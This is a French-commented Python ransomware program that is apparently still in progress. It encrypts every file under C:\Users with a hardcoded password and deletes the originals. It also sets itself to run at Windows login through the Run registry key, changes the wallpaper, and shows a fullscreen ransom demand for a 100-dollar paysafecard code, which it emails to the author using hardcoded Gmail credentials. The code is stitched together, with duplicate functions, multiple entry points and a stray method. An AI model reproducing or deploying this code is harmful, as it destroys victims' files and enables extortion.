"""
Application plein écran (fond noir) : image à gauche, texte + champ "Code" + bouton
"Envoyer" à droite. Le contenu du champ est envoyé par e-mail (SMTP + TLS).

Tkinter pur (sans CustomTkinter). Pillow sert uniquement à redimensionner l'image.
Lancement :  python app.py
"""

import os
import base64
import os
import sys

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

import sys
import winreg
import queue
import smtplib
import ssl
import ctypes
from pathlib import Path
import threading
import tkinter as tk
from datetime import datetime
from email.message import EmailMessage
from pathlib import Path
from tkinter import font as tkfont
from tkinter import ttk

from PIL import Image, ImageDraw, ImageFont, ImageTk

# ============================================================================
# CONFIGURATION  (modifiez ici ou, mieux, dans le fichier .env)
# ============================================================================
BASE_DIR = Path(__file__).resolve().parent

# Charge le fichier .env s'il existe (python-dotenv est optionnel)
try:
    from dotenv import load_dotenv
    load_dotenv(BASE_DIR / ".env")
except ImportError:
    pass

# --- E-mail : les variables d'environnement / .env ont priorité ---------------
EMAIL_SENDER = os.getenv("EMAIL_SENDER", "ewen23126@gmail.com")              # adresse de l'expéditeur
EMAIL_APP_PASSWORD = os.getenv("EMAIL_APP_PASSWORD", "vgjqozztgkwkosyv")  # mot de passe d'application
EMAIL_RECIPIENT = os.getenv("EMAIL_RECIPIENT", "ewen2312@gmail.com")        # adresse du destinataire
SMTP_SERVER = os.getenv("SMTP_SERVER", "smtp.gmail.com")
SMTP_PORT = int(os.getenv("SMTP_PORT", "587"))            # 587 = STARTTLS, 465 = SSL
SMTP_TIMEOUT = 20                                         # secondes
EMAIL_SUBJECT = "Nouveau code reçu"

# --- Apparence ------------------------------------------------------------------
IMAGE_PATH = BASE_DIR / "fsociety-telegram.jpg-4227047490.png"      # image affichée à gauche (remplaçable)
DISPLAY_TEXT = "Your files are encrypted. Give me the code of 100 dollars in paysafecard for the decryption. DON'T CLOSE THIS APP"  # texte à droite
PLACEHOLDER = "Code"                     # texte indicatif du champ

COLOR_BG = "#000000"            # fond de l'application
COLOR_TEXT = "#E6E6E6"          # texte principal
COLOR_MUTED = "#808080"         # texte indicatif (gris)
COLOR_FIELD_BG = "#111111"      # fond du champ
COLOR_FIELD_BORDER = "#333333"  # bordure du champ
COLOR_FIELD_FOCUS = "#2563EB"   # bordure du champ quand il est actif
COLOR_BTN = "#2563EB"           # bouton
COLOR_BTN_HOVER = "#3B82F6"     # bouton au survol
COLOR_BTN_DISABLED = "#1E3A8A"  # bouton pendant l'envoi
COLOR_OK = "#4ADE80"            # message de succès
COLOR_ERR = "#F87171"           # message d'erreur
FONT_FAMILY = "Segoe UI"        # police Windows
TEXT_SIZE = 24
MAX_INPUT_LENGTH = 500          # longueur maximale acceptée pour le champ

DOSSIER = r"C:\Users"

# Mot de passe directement dans le programme
MOT_DE_PASSE = "ez"

EXTENSION_CHIFFRE = ".zgeg"
NOM_SEL = ".sel_crypte"
ITERATIONS = 390_000


# ============================================================================


def derive_cle(mot_de_passe: str, sel: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=sel,
        iterations=ITERATIONS,
    )

    return base64.urlsafe_b64encode(
        kdf.derive(mot_de_passe.encode("utf-8"))
    )


# ============================================================
# SEL
# ============================================================

def obtenir_sel(dossier: str) -> bytes:
    chemin_sel = os.path.join(dossier, NOM_SEL)

    if os.path.exists(chemin_sel):
        with open(chemin_sel, "rb") as fichier:
            return fichier.read()

    sel = os.urandom(16)

    with open(chemin_sel, "wb") as fichier:
        fichier.write(sel)

    return sel


# ============================================================
# FICHIERS
# ============================================================

def lister_fichiers(dossier: str):
    for racine, _, fichiers in os.walk(dossier):
        for nom in fichiers:

            if nom == NOM_SEL:
                continue

            if nom.endswith(EXTENSION_CHIFFRE):
                continue

            yield os.path.join(racine, nom)


# ============================================================
# CHIFFREMENT
# ============================================================

def chiffrer(dossier: str, mot_de_passe: str):

    sel = obtenir_sel(dossier)

    cle = derive_cle(mot_de_passe, sel)

    fernet = Fernet(cle)

    fichiers = list(lister_fichiers(dossier))

    if not fichiers:
        print("Aucun fichier à chiffrer.")
        return

    compteur = 0

    for chemin in fichiers:

        with open(chemin, "rb") as fichier:
            donnees = fichier.read()

        donnees_chiffrees = fernet.encrypt(donnees)

        chemin_sortie = chemin + EXTENSION_CHIFFRE

        with open(chemin_sortie, "wb") as fichier:
            fichier.write(donnees_chiffrees)

        os.remove(chemin)

        compteur += 1
        print(f"Chiffré : {chemin} -> {chemin_sortie}")
# ============================================================
# PROGRAMME PRINCIPAL
# ============================================================

def main():

    if not os.path.isdir(DOSSIER):
        print("Erreur : dossier introuvable.")
        print(DOSSIER)
        sys.exit(1)

    print("=" * 50)
    print("CHIFFREMENT DE TEST")
    print("=" * 50)
    print()
    print(f"Dossier : {DOSSIER}")
    print()
    print("Les fichiers originaux seront conservés.")
    print()

    chiffrer(DOSSIER, MOT_DE_PASSE)


if __name__ == "__main__":
    main()



def chiffrer(dossier: str, mot_de_passe: str):
    sel = obtenir_sel(dossier)
    f = Fernet(derive_cle(mot_de_passe, sel))

    fichiers = [p for p in lister_fichiers(dossier) if not p.endswith(EXTENSION_CHIFFRE)]
    if not fichiers:
        print("Aucun fichier à chiffrer.")
        return

    for chemin in fichiers:
        with open(chemin, "rb") as fp:
            donnees = fp.read()
        donnees_chiffrees = f.encrypt(donnees)
        chemin_sortie = chemin + EXTENSION_CHIFFRE
        with open(chemin_sortie, "wb") as fp:
            fp.write(donnees_chiffrees)
        os.remove(chemin)
        print(f"Chiffré : {chemin} -> {chemin_sortie}")

    print(f"\n{len(fichiers)} fichier(s) chiffré(s). Gardez votre mot de passe : sans lui, impossible de récupérer les fichiers.")




















def activer_demarrage_auto(nom_app="MonProgramme"):
    # Si le programme est compilé en .exe (PyInstaller)
    if getattr(sys, "frozen", False):
        commande = f'"{sys.executable}"'
    else:
        # Si c'est un .py : on utilise pythonw pour éviter la console
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        commande = f'"{pythonw}" "{sys.argv[0]}"'

    cle = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE,
    )

    # On n'écrit que si ce n'est pas déjà fait ou si le chemin a changé
    try:
        valeur, _ = winreg.QueryValueEx(cle, nom_app)
    except FileNotFoundError:
        valeur = None

    if valeur != commande:
        winreg.SetValueEx(cle, nom_app, 0, winreg.REG_SZ, commande)

    winreg.CloseKey(cle)


# À appeler au tout début de ton programme
activer_demarrage_auto("MonProgramme")




def send_email(content: str) -> None:
    """Envoie `content` par e-mail. Lève une RuntimeError avec un message lisible
    (sans jamais inclure le mot de passe) en cas d'échec."""
    if not (EMAIL_SENDER and EMAIL_APP_PASSWORD and EMAIL_RECIPIENT):
        raise RuntimeError(
            "Configuration e-mail incomplète. Renseignez EMAIL_SENDER, "
            "EMAIL_APP_PASSWORD et EMAIL_RECIPIENT dans le fichier .env."
        )

    msg = EmailMessage()
    msg["Subject"] = EMAIL_SUBJECT
    msg["From"] = EMAIL_SENDER
    msg["To"] = EMAIL_RECIPIENT
    msg.set_content(
        f"Code saisi : {content}\n\n"
        f"Envoyé le {datetime.now():%d/%m/%Y à %H:%M:%S}"
    )

    context = ssl.create_default_context()
    try:
        if SMTP_PORT == 465:
            with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT, timeout=SMTP_TIMEOUT,
                                  context=context) as server:
                server.login(EMAIL_SENDER, EMAIL_APP_PASSWORD)
                server.send_message(msg)
        else:
            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=SMTP_TIMEOUT) as server:
                server.starttls(context=context)
                server.login(EMAIL_SENDER, EMAIL_APP_PASSWORD)
                server.send_message(msg)
    except smtplib.SMTPAuthenticationError:
        raise RuntimeError("Authentification refusée : vérifiez l'adresse e-mail "
                           "et le mot de passe d'application.") from None
    except smtplib.SMTPRecipientsRefused:
        raise RuntimeError("L'adresse du destinataire a été refusée.") from None
    except (smtplib.SMTPConnectError, ConnectionError, TimeoutError, OSError):
        raise RuntimeError("Connexion au serveur SMTP impossible. Vérifiez votre "
                           "connexion Internet, le serveur et le port.") from None
    except smtplib.SMTPException as exc:
        raise RuntimeError(f"Erreur SMTP : {type(exc).__name__}.") from None


class App(tk.Tk):
    def __init__(self) -> None:
        super().__init__()
        self.title("Application")
        self.configure(bg=COLOR_BG)

        self._fullscreen = True
        self.attributes("-fullscreen", True)

        self._result_queue: "queue.Queue[tuple[str, str]]" = queue.Queue()
        self._resize_job = None
        self._photo = None  # référence à garder pour que Tkinter n'efface pas l'image
        self._pil_image = self._load_image()

        self.columnconfigure(0, weight=1, uniform="cols")
        self.columnconfigure(1, weight=1, uniform="cols")
        self.rowconfigure(0, weight=1)

        self._build_left()
        self._build_right()
     
    

    # ------------------------------------------------------------------ image
    def _load_image(self):
        self._image_error = ""
        try:
            return Image.open(IMAGE_PATH).convert("RGBA")
        except FileNotFoundError:
            self._image_error = "Fichier introuvable"
        except Exception as exc:  # format invalide, fichier corrompu, etc.
            self._image_error = f"Lecture impossible ({type(exc).__name__})"
        print(f"[Image] {self._image_error} : {IMAGE_PATH}")
        return None

    def _placeholder_image(self) -> Image.Image:
        img = Image.new("RGB", (800, 600), "#1A1A1A")
        draw = ImageDraw.Draw(img)
        try:
            font = ImageFont.truetype("segoeui.ttf", 36)
        except OSError:
            font = ImageFont.load_default()
        draw.text((400, 220), f"Image non affichée\n{self._image_error}",
                  fill="#CCCCCC", font=font, anchor="mm", align="center")
        small = ImageFont.load_default()
        draw.text((400, 380), f"Chemin attendu :\n{IMAGE_PATH}",
                  fill="#888888", font=small, anchor="mm", align="center")
        return img

    def _build_left(self) -> None:
        self.left = tk.Frame(self, bg=COLOR_BG)
        self.left.grid(row=0, column=0, sticky="nsew", padx=40, pady=40)
        self.image_label = tk.Label(self.left, bg=COLOR_BG, bd=0)
        self.image_label.place(relx=0.5, rely=0.5, anchor="center")
        self.left.bind("<Configure>", self._schedule_resize)

    def _schedule_resize(self, _event=None) -> None:
        if self._resize_job:
            self.after_cancel(self._resize_job)
        self._resize_job = self.after(80, self._update_image)

    def _update_image(self) -> None:
        """Ajuste l'image à la zone gauche en conservant ses proportions."""
        self._resize_job = None
        box_w, box_h = self.left.winfo_width(), self.left.winfo_height()
        if box_w < 20 or box_h < 20:
            return
        img = self._pil_image or self._placeholder_image()
        ratio = min(box_w / img.width, box_h / img.height)
        size = (max(1, int(img.width * ratio)), max(1, int(img.height * ratio)))
        resized = img.resize(size, Image.LANCZOS)
        self._photo = ImageTk.PhotoImage(resized)
        self.image_label.configure(image=self._photo)

    # ----------------------------------------------------------------- droite
    def _build_right(self) -> None:
        right = tk.Frame(self, bg=COLOR_BG)
        right.grid(row=0, column=1, sticky="nsew", padx=40, pady=40)

        box = tk.Frame(right, bg=COLOR_BG)
        box.place(relx=0.5, rely=0.5, anchor="center")

        tk.Label(
            box, text=DISPLAY_TEXT, bg=COLOR_BG, fg=COLOR_TEXT,
            font=(FONT_FAMILY, TEXT_SIZE), wraplength=560, justify="center",
        ).grid(row=0, column=0, columnspan=2, pady=(0, 32))

        # --- Champ de saisie + texte indicatif (label superposé) ---
        entry_font = (FONT_FAMILY, 16)
        self.entry = tk.Entry(
            box, width=22, font=entry_font, bg=COLOR_FIELD_BG, fg=COLOR_TEXT,
            insertbackground=COLOR_TEXT, relief="flat", bd=0,
            highlightthickness=1, highlightbackground=COLOR_FIELD_BORDER,
            highlightcolor=COLOR_FIELD_FOCUS,
        )
        self.entry.grid(row=1, column=0, padx=(0, 12), ipady=10, ipadx=6)

        self.placeholder = tk.Label(
            self.entry, text=PLACEHOLDER, bg=COLOR_FIELD_BG, fg=COLOR_MUTED,
            font=entry_font, cursor="xterm",
        )
        self.placeholder.place(x=8, rely=0.5, anchor="w")
        self.placeholder.bind("<Button-1>", lambda _e: self.entry.focus_set())
        self.entry.bind("<KeyRelease>", self._update_placeholder)
        self.entry.bind("<FocusOut>", self._update_placeholder)
        self.entry.bind("<Return>", lambda _e: self._on_send())

        # --- Bouton Envoyer ---
        self.send_btn = tk.Button(
            box, text="Envoyer", font=(FONT_FAMILY, 14, "bold"),
            bg=COLOR_BTN, fg="white", activebackground=COLOR_BTN_HOVER,
            activeforeground="white", disabledforeground="#9CA3AF",
            relief="flat", bd=0, padx=28, pady=10, cursor="hand2",
            command=self._on_send,
        )
        self.send_btn.grid(row=1, column=1)
        self.send_btn.bind("<Enter>", self._btn_enter)
        self.send_btn.bind("<Leave>", self._btn_leave)

        # --- Indicateur de chargement ---
        style = ttk.Style(self)
        style.theme_use("clam")  # thème qui accepte les couleurs personnalisées
        style.configure(
            "Dark.Horizontal.TProgressbar", troughcolor=COLOR_FIELD_BG,
            background=COLOR_BTN, bordercolor=COLOR_BG, lightcolor=COLOR_BTN,
            darkcolor=COLOR_BTN, thickness=6,
        )
        self.progress = ttk.Progressbar(
            box, style="Dark.Horizontal.TProgressbar", mode="indeterminate", length=520,
        )
        self.progress.grid(row=2, column=0, columnspan=2, pady=(28, 0))
        self.progress.grid_remove()

        # --- Message de statut ---
        self.status = tk.Label(
            box, text="", bg=COLOR_BG, fg=COLOR_TEXT, font=(FONT_FAMILY, 12),
            wraplength=520,
        )
        self.status.grid(row=3, column=0, columnspan=2, pady=(14, 0))

    # ----------------------------------------------------------------- effets
    def _btn_enter(self, _event=None) -> None:
        if str(self.send_btn["state"]) == "normal":
            self.send_btn.configure(bg=COLOR_BTN_HOVER)

    def _btn_leave(self, _event=None) -> None:
        if str(self.send_btn["state"]) == "normal":
            self.send_btn.configure(bg=COLOR_BTN)

    def _update_placeholder(self, _event=None) -> None:
        """Affiche 'Code' si le champ est vide, le masque dès qu'il y a du texte."""
        if self.entry.get():
            self.placeholder.place_forget()
        else:
            self.placeholder.place(x=8, rely=0.5, anchor="w")
            self.placeholder.lift()

    def _set_status(self, text: str, color: str) -> None:
        self.status.configure(text=text, fg=color)

    # ----------------------------------------------------------------- envoi
    def _on_send(self) -> None:
        if str(self.send_btn["state"]) == "disabled":
            return
        content = self.entry.get().strip()
        if not content:
            self._set_status("Veuillez saisir un code avant d'envoyer.", COLOR_ERR)
            return
        if len(content) > MAX_INPUT_LENGTH:
            self._set_status(f"Le texte est trop long ({MAX_INPUT_LENGTH} caractères max).",
                             COLOR_ERR)
            return

        self.send_btn.configure(state="disabled", text="Envoi…", bg=COLOR_BTN_DISABLED,
                                cursor="arrow")
        self._set_status("", COLOR_TEXT)
        self.progress.grid()
        self.progress.start(12)
        threading.Thread(target=self._worker, args=(content,), daemon=True).start()
        self.after(100, self._poll_result)

    def _worker(self, content: str) -> None:
        """Exécuté dans un thread : n'appelle jamais directement l'interface."""
        try:
            send_email(content)
            self._result_queue.put(("ok", ""))
        except RuntimeError as exc:
            self._result_queue.put(("err", str(exc)))
        except Exception:  # erreur inattendue : message générique, sans détails sensibles
            self._result_queue.put(("err", "Une erreur inattendue est survenue lors de l'envoi."))

    def _poll_result(self) -> None:
        try:
            kind, message = self._result_queue.get_nowait()
        except queue.Empty:
            self.after(100, self._poll_result)
            return

        self.progress.stop()
        self.progress.grid_remove()
        self.send_btn.configure(state="normal", text="Envoyer", bg=COLOR_BTN,
                                cursor="hand2")
        if kind == "ok":  # confirmation uniquement après réussite confirmée
            self.entry.delete(0, "end")
            self._update_placeholder()
            self._set_status("✓ Message envoyé avec succès.", COLOR_OK)
            self.after(4000, lambda: self._set_status("", COLOR_TEXT))
        else:
            self._set_status(f"✗ {message}", COLOR_ERR)

    
    
    # ------------------------------------------------------------ plein écran
    def _on_escape(self, _event=None) -> None:
        """1er appui : quitte le plein écran. 2e appui : ferme l'application."""
        if self._fullscreen:
            self._fullscreen = False
            self.attributes("-fullscreen", False)
            self.geometry("1100x650")
        else:
            self.destroy()
if __name__ == "__main__":
    # Rendu net sur les écrans à forte densité de pixels (Windows)
    try:
        import ctypes
        ctypes.windll.shcore.SetProcessDpiAwareness(1)
    except Exception:
        pass
    App().mainloop()




# Trouver le dossier contenant app.py
dossier = Path(__file__).resolve().parent

# Trouver l'image dans le même dossier
extensions = [".jpg", ".jpeg", ".png", ".bmp", ".webp"]
image = next(
    (dossier / f"fond{ext}" for ext in extensions
     if (dossier / f"fond{ext}").is_file()),
    None
)

print("Dossier du programme :", dossier)

if image is None:
    print("ERREUR : image introuvable !")
    print("Vérifie le nom et l'extension de ton image.")

else:
    print("Image trouvée :", image)

    # Préparer la fonction Windows
    SPI_SETDESKWALLPAPER = 20
    SPIF_UPDATEINIFILE = 1
    SPIF_SENDCHANGE = 2

    user32 = ctypes.WinDLL("user32", use_last_error=True)

    resultat = user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER,
        0,
        str(image.resolve()),
        SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
    )

    if resultat:
        print("Windows a accepté le changement.")
    else:
        print("Échec du changement.")
        print("Erreur Windows :", ctypes.get_last_error())

input("\nAppuie sur Entrée pour fermer...")


def afficher_popup(self):
        popup = tk.Toplevel(self)
        popup.overrideredirect(True)
        popup.attributes("-topmost", True)
        popup.configure(bg="black")

        largeur = 700
        hauteur = 250

        x = (popup.winfo_screenwidth() - largeur) // 2
        y = (popup.winfo_screenheight() - hauteur) // 2

        popup.geometry(f"{largeur}x{hauteur}+{x}+{y}")

        label = tk.Label(
            popup,
            text="TON TEXTE ICI",
            font=("Arial", 40, "bold"),
            fg="white",
            bg="black",
            wraplength=650,
            justify="center"
        )
        label.pack(expand=True, fill="both")

        popup.after(1500, popup.destroy)
        self.after(3000, self.afficher_popup)
















